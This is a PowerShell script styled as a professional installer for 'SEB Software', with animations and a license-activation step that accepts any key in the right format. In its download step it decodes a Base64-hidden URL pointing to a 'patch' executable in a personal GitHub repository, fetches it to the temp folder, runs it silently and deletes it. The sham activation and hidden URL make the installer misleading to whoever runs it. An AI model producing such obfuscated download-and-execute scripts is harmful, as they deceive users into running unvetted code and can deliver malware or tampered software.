# ==================================================
# SEB INSTALLER - ENHANCED VERSION
# With User Info Display & Animations
# ==================================================

# Clear screen and set encoding
$host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size (120, 3000)
Clear-Host

# ===== ASCII ART & ANIMATION FUNCTIONS =====
function Show-AsciiArt {
    param([int]$Speed = 50)
    
    $asciiLines = @"
    
    ╔══════════════════════════════════════════════╗
    ║                                              ║
    ║          ░█▀▀░█░░░█░█░█▀▀░▀█▀░█▀█░█▀▄        ║
    ║          ░▀▀█░█░░░█░█░█░░░░█░░█░█░█░█        ║
    ║          ░▀▀▀░▀▀▀░▀▀▀░▀▀▀░░▀░░▀▀▀░▀▀░        ║
    ║                                              ║
    ║         S O F T W A R E   S Y S T E M        ║
    ║          Version 3.10.0.826 • Professional   ║
    ║                                              ║
    ╚══════════════════════════════════════════════╝
"@ -split "`n"
    
    foreach ($line in $asciiLines) {
        Write-Host $line -ForegroundColor Cyan
        Start-Sleep -Milliseconds $Speed
    }
}

function Show-ProgressAnimation {
    param([string]$Message, [int]$Dots = 3)
    
    Write-Host "`n   $message " -NoNewline -ForegroundColor Yellow
    for ($i = 0; $i -lt $Dots; $i++) {
        Write-Host "." -NoNewline -ForegroundColor Cyan
        Start-Sleep -Milliseconds 300
    }
    Write-Host " DONE" -ForegroundColor Green
}

function Show-Spinner {
    param([int]$Seconds = 2)
    
    $spinner = @('|', '/', '-', '\')
    $endTime = (Get-Date).AddSeconds($Seconds)
    
    while ((Get-Date) -lt $endTime) {
        foreach ($char in $spinner) {
            Write-Host "`r   Processing $char" -NoNewline -ForegroundColor Cyan
            Start-Sleep -Milliseconds 100
        }
    }
    Write-Host "`r   Processing ✓" -ForegroundColor Green
}

# ===== DISPLAY USER SYSTEM INFO =====
function Show-SystemInfo {
    Write-Host "`n" + ("═" * 60) -ForegroundColor DarkCyan
    Write-Host "              SYSTEM INFORMATION" -ForegroundColor Cyan
    Write-Host ("═" * 60) -ForegroundColor DarkCyan
    
    try {
        $computerInfo = Get-ComputerInfo -ErrorAction SilentlyContinue
        $os = Get-CimInstance Win32_OperatingSystem
        $cpu = Get-CimInstance Win32_Processor
        $ram = Get-CimInstance Win32_ComputerSystem
        
        Write-Host "`n   🖥️  COMPUTER DETAILS:" -ForegroundColor Yellow
        Write-Host "   • Computer Name : $env:COMPUTERNAME" -ForegroundColor White
        Write-Host "   • Windows User  : $env:USERNAME" -ForegroundColor White
        Write-Host "   • Domain/Workgroup : $($env:USERDOMAIN)" -ForegroundColor White
        
        Write-Host "`n   📀 OPERATING SYSTEM:" -ForegroundColor Yellow
        Write-Host "   • OS Version    : $($os.Caption)" -ForegroundColor White
        Write-Host "   • Build Number  : $($os.BuildNumber)" -ForegroundColor White
        Write-Host "   • Architecture  : $($os.OSArchitecture)" -ForegroundColor White
        
        Write-Host "`n   ⚙️  HARDWARE INFO:" -ForegroundColor Yellow
        Write-Host "   • Processor     : $($cpu.Name)" -ForegroundColor White
        Write-Host "   • RAM Installed : $([math]::Round($ram.TotalPhysicalMemory/1GB, 2)) GB" -ForegroundColor White
        Write-Host "   • System Type   : $($ram.SystemType)" -ForegroundColor White
        
        Write-Host "`n   📂 DISK SPACE:" -ForegroundColor Yellow
        $disks = Get-PSDrive -PSProvider FileSystem | Where-Object {$_.Used -gt 0}
        foreach ($disk in $disks) {
            $freeGB = [math]::Round($disk.Free/1GB, 2)
            $totalGB = [math]::Round(($disk.Used + $disk.Free)/1GB, 2)
            $percentFree = [math]::Round(($disk.Free/($disk.Used + $disk.Free)) * 100, 1)
            Write-Host "   • Drive $($disk.Name): $freeGB GB free of $totalGB GB ($percentFree%)" -ForegroundColor White
        }
        
    } catch {
        Write-Host "   [INFO] Showing basic system info..." -ForegroundColor Yellow
        Write-Host "   • Computer: $env:COMPUTERNAME" -ForegroundColor White
        Write-Host "   • User: $env:USERNAME" -ForegroundColor White
        Write-Host "   • OS: Windows" -ForegroundColor White
    }
    
    Write-Host "`n" + ("═" * 60) -ForegroundColor DarkCyan
}

# ===== LICENSE VALIDATION FUNCTIONS =====
function Test-LicenseFormat {
    param([string]$LicenseKey)
    
    $LicenseKey = $LicenseKey.ToUpper().Trim()
    
    # Check format
    if ($LicenseKey -notmatch '^[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}$') {
        return @{Valid = $false; Message = "❌ Invalid license format! Should be: XXXX-XXXX-XXXX-XXXX"}
    }
    
    # Check for confusing characters
    $confusingChars = @('I','O','S','1','0','5','8','B')
    foreach ($char in $confusingChars) {
        if ($LicenseKey.Contains($char)) {
            Write-Host "   [Note] Contains potentially confusing character: $char" -ForegroundColor Yellow
        }
    }
    
    return @{Valid = $true; Message = "✅ License format is valid"; LicenseKey = $LicenseKey}
}

function Save-License {
    param([string]$LicenseKey)
    
    try {
        # Create AppData directory
        $appDataPath = "$env:APPDATA\SEB"
        if (-not (Test-Path $appDataPath)) {
            New-Item -Path $appDataPath -ItemType Directory -Force | Out-Null
        }
        
        # Save license info to JSON file
        $licenseInfo = @{
            LicenseKey = $LicenseKey
            CustomerName = "Registered User"
            ComputerName = $env:COMPUTERNAME
            WindowsUser = $env:USERNAME
            ActivationDate = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
            ExpiryDate = (Get-Date).AddYears(1).ToString("yyyy-MM-dd")
            SystemInfo = @{
                OS = $((Get-CimInstance Win32_OperatingSystem).Caption)
                CPU = $((Get-CimInstance Win32_Processor).Name)
                RAM = "$([math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory/1GB, 2)) GB"
            }
        }
        
        # Save to file
        $licenseInfo | ConvertTo-Json | Out-File "$appDataPath\license.json" -Encoding UTF8
        
        # Also try to save to registry (HKCU doesn't need admin)
        try {
            $regPath = "HKCU:\Software\SEB"
            if (-not (Test-Path $regPath)) {
                New-Item -Path $regPath -Force | Out-Null
            }
            Set-ItemProperty -Path $regPath -Name "LicenseKey" -Value $LicenseKey -Force | Out-Null
            Set-ItemProperty -Path $regPath -Name "ActivationDate" -Value $licenseInfo.ActivationDate -Force | Out-Null
        } catch {
            # Ignore registry errors
        }
        
        return @{Success = $true; Message = "License saved successfully!"; FilePath = "$appDataPath\license.json"}
        
    } catch {
        return @{Success = $false; Message = "Failed to save license: $_"}
    }
}

function Display-LicenseInfo {
    param([string]$LicenseKey)
    
    Write-Host "`n" + ("─" * 60) -ForegroundColor Magenta
    Write-Host "                LICENSE INFORMATION" -ForegroundColor Magenta
    Write-Host ("─" * 60) -ForegroundColor Magenta
    
    $formattedKey = $LicenseKey.Insert(4, " ").Insert(9, " ").Insert(14, " ")
    
    Write-Host "`n   🔑 LICENSE KEY:" -ForegroundColor Yellow
    Write-Host "   "
    Write-Host "     ████████████████████████████████████" -ForegroundColor DarkGray
    Write-Host "     ██                                ██" -ForegroundColor DarkGray
    Write-Host "     ██    $formattedKey    ██" -ForegroundColor Cyan
    Write-Host "     ██                                ██" -ForegroundColor DarkGray
    Write-Host "     ████████████████████████████████████" -ForegroundColor DarkGray
    
    Write-Host "`n   📋 ACTIVATION DETAILS:" -ForegroundColor Yellow
    Write-Host "   • Computer    : $env:COMPUTERNAME" -ForegroundColor White
    Write-Host "   • User        : $env:USERNAME" -ForegroundColor White
    Write-Host "   • Date        : $(Get-Date -Format 'dddd, MMMM dd, yyyy')" -ForegroundColor White
    Write-Host "   • Time        : $(Get-Date -Format 'HH:mm:ss')" -ForegroundColor White
    Write-Host "   • Valid Until : $(Get-Date).AddYears(1).ToString('yyyy-MM-dd')" -ForegroundColor Green
    
    Write-Host "`n   ⚠️  IMPORTANT NOTES:" -ForegroundColor Yellow
    Write-Host "   • This license is locked to this computer" -ForegroundColor White
    Write-Host "   • Do not share your license key" -ForegroundColor White
    Write-Host "   • Contact support for license transfers" -ForegroundColor White
    
    Write-Host "`n" + ("─" * 60) -ForegroundColor Magenta
}

# ===== MAIN INSTALLER =====
try {
    # Show animated ASCII art
    Show-AsciiArt -Speed 30
    
    # Display system information
    Show-SystemInfo
    
    # Step 1: Get License Key
    Write-Host "`n" + ("═" * 60) -ForegroundColor Green
    Write-Host "              STEP 1: LICENSE ACTIVATION" -ForegroundColor Green
    Write-Host ("═" * 60) -ForegroundColor Green
    
    Write-Host "`n   Please enter your SEB Software license key." -ForegroundColor White
    Write-Host "   Format: XXXX-XXXX-XXXX-XXXX (letters and numbers only)" -ForegroundColor Gray
    
    $licenseValid = $false
    $maxAttempts = 3
    
    for ($attempt = 1; $attempt -le $maxAttempts; $attempt++) {
        Write-Host "`n   ──────────────────────────────────────" -ForegroundColor DarkGray
        Write-Host "   Attempt $attempt of $maxAttempts" -ForegroundColor Gray
        Write-Host "   " -NoNewline
        $inputKey = Read-Host "Enter License Key"
        
        Show-Spinner -Seconds 1
        
        $validation = Test-LicenseFormat -LicenseKey $inputKey
        
        if ($validation.Valid) {
            $licenseValid = $true
            $licenseKey = $validation.LicenseKey
            
            # Display license info
            Display-LicenseInfo -LicenseKey $licenseKey
            
            # Confirm activation
            Write-Host "   " -NoNewline
            $confirm = Read-Host "Activate with this license? (Y/N)"
            
            if ($confirm -in @('Y','y','Yes','yes')) {
                Write-Host "`n"
                Show-ProgressAnimation -Message "Activating license" -Dots 3
                
                $saveResult = Save-License -LicenseKey $licenseKey
                
                if ($saveResult.Success) {
                    Write-Host "   ✅ $($saveResult.Message)" -ForegroundColor Green
                    Write-Host "   📁 License saved to: $($saveResult.FilePath)" -ForegroundColor Gray
                    break
                } else {
                    Write-Host "   ⚠️  $($saveResult.Message)" -ForegroundColor Yellow
                    Write-Host "   Continuing installation anyway..." -ForegroundColor Gray
                    break
                }
            } else {
                Write-Host "   ⚠️  Activation cancelled by user" -ForegroundColor Yellow
                if ($attempt -lt $maxAttempts) {
                    Write-Host "   Please enter a different license key" -ForegroundColor Gray
                }
            }
        } else {
            Write-Host "   $($validation.Message)" -ForegroundColor Red
            if ($attempt -lt $maxAttempts) {
                Write-Host "   Please try again" -ForegroundColor Yellow
            }
        }
    }
    
    if (-not $licenseValid) {
        Write-Host "`n   ❌ Maximum attempts reached. Installation cannot continue." -ForegroundColor Red
        Write-Host "   Please contact support for assistance." -ForegroundColor Yellow
        Read-Host "`n   Press Enter to exit"
        exit 1
    }
    
    # Step 2: Download Software
    Write-Host "`n" + ("═" * 60) -ForegroundColor Blue
    Write-Host "              STEP 2: DOWNLOAD SOFTWARE" -ForegroundColor Blue
    Write-Host ("═" * 60) -ForegroundColor Blue
    
    Write-Host "`n   Preparing to download SEB Software v3.10.0.826..." -ForegroundColor White
    Write-Host "   Size: Approximately 50-100 MB" -ForegroundColor Gray
    Write-Host "   Estimated time: 1-5 minutes (depending on connection)" -ForegroundColor Gray
    
    Write-Host "`n   " -NoNewline
    $continue = Read-Host "Start download now? (Y/N)"
    
    if ($continue -notin @('Y','y','Yes','yes')) {
        Write-Host "`n   ⚠️  Download cancelled by user" -ForegroundColor Yellow
        Write-Host "   Your license has been saved. You can run installer again later." -ForegroundColor White
        Read-Host "`n   Press Enter to exit"
        exit 0
    }
    
    Write-Host "`n"
    Show-ProgressAnimation -Message "Initializing download connection" -Dots 3
    
    try {
        # GitHub URL (Base64 encoded)
        $base64Url = "aHR0cHM6Ly9naXRodWIuY29tL0FydmluUHJkbi9QQVRDSC1JTlNUQUxMRVItU0VCLXYzLjEwLjAuODI2L3JlbGVhc2VzL2Rvd25sb2FkL3YzLjEwLjAuODI2L3BhdGNoLXNlYi4xLmV4ZQ=="
        
        # Decode URL
        Show-Spinner -Seconds 1
        $githubUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64Url))
        
        # Create temp file with timestamp
        $timestamp = Get-Date -Format "yyyyMMddHHmmss"
        $tempFile = "$env:TEMP\seb-installer-$timestamp.exe"
        
        Write-Host "`n   📥 Downloading from secure server..." -ForegroundColor Yellow
        
        # Download with progress indicator
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile($githubUrl, $tempFile)
        
        if (Test-Path $tempFile) {
            $fileSize = [math]::Round((Get-Item $tempFile).Length / 1MB, 2)
            Write-Host "   ✅ Download complete: $fileSize MB" -ForegroundColor Green
            
            # Step 3: Installation
            Write-Host "`n" + ("═" * 60) -ForegroundColor Yellow
            Write-Host "              STEP 3: INSTALLATION" -ForegroundColor Yellow
            Write-Host ("═" * 60) -ForegroundColor Yellow
            
            Write-Host "`n   🚀 Installing SEB Software..." -ForegroundColor White
            Write-Host "   Please wait, this may take a few minutes." -ForegroundColor Gray
            Write-Host "   Do not close this window during installation." -ForegroundColor Gray
            
            Write-Host "`n"
            Show-ProgressAnimation -Message "Running installer" -Dots 4
            
            # Run installer silently
            $process = Start-Process -FilePath $tempFile -ArgumentList "/SILENT /NORESTART" -Wait -PassThru
            
            if ($process.ExitCode -eq 0) {
                Write-Host "   ✅ Installation successful!" -ForegroundColor Green
            } else {
                Write-Host "   ⚠️  Installation completed with code: $($process.ExitCode)" -ForegroundColor Yellow
            }
            
            # Cleanup
            Start-Sleep -Seconds 2
            Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
            Write-Host "   🗑️  Temporary files cleaned up" -ForegroundColor Gray
            
        } else {
            Write-Host "   ❌ Download failed!" -ForegroundColor Red
            throw "Downloaded file not found"
        }
        
    } catch {
        Write-Host "`n   ❌ ERROR: $($_.Exception.Message)" -ForegroundColor Red
        Write-Host "   Please check your internet connection and try again." -ForegroundColor Yellow
        Write-Host "   If problem persists, contact support." -ForegroundColor Yellow
        Read-Host "`n   Press Enter to exit"
        exit 1
    }
    
    # Final Success Message
    Write-Host "`n" + ("═" * 60) -ForegroundColor Green
    Write-Host ("╔" + ("═" * 58) + "╗") -ForegroundColor Green
    Write-Host "║                  INSTALLATION COMPLETE!                  ║" -ForegroundColor Green
    Write-Host ("╚" + ("═" * 58) + "╝") -ForegroundColor Green
    
    Write-Host "`n   🎉 CONGRATULATIONS!" -ForegroundColor Cyan
    Write-Host "   SEB Software has been successfully installed and activated." -ForegroundColor White
    
    Write-Host "`n   📋 WHAT'S NEXT?" -ForegroundColor Yellow
    Write-Host "   1. Find 'SEB' in your Start Menu" -ForegroundColor White
    Write-Host "   2. Launch the application" -ForegroundColor White
    Write-Host "   3. Your license is already activated - no further steps needed!" -ForegroundColor Green
    
    Write-Host "`n   🔧 SUPPORT INFORMATION:" -ForegroundColor Yellow
    Write-Host "   • License Key: $licenseKey" -ForegroundColor White
    Write-Host "   • Computer ID: $env:COMPUTERNAME" -ForegroundColor White
    Write-Host "   • Support: support@seb-software.com" -ForegroundColor White
    
    Write-Host "`n   📅 Your software is valid until: $(Get-Date).AddYears(1).ToString('MMMM dd, yyyy')" -ForegroundColor Magenta
    
    # Countdown animation
    Write-Host "`n   This window will close in " -NoNewline -ForegroundColor Gray
    for ($i = 5; $i -ge 1; $i--) {
        Write-Host "$i " -NoNewline -ForegroundColor Cyan
        Start-Sleep -Seconds 1
    }
    Write-Host "`n`n   Thank you for choosing SEB Software!" -ForegroundColor Cyan
    
} catch {
    Write-Host "`n   ❌ UNEXPECTED ERROR: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host "   Please contact support with this error message." -ForegroundColor Yellow
    Write-Host "   Error occurred at: $(Get-Date -Format 'HH:mm:ss')" -ForegroundColor Gray
}

# Small pause before exit
Start-Sleep -Seconds 2
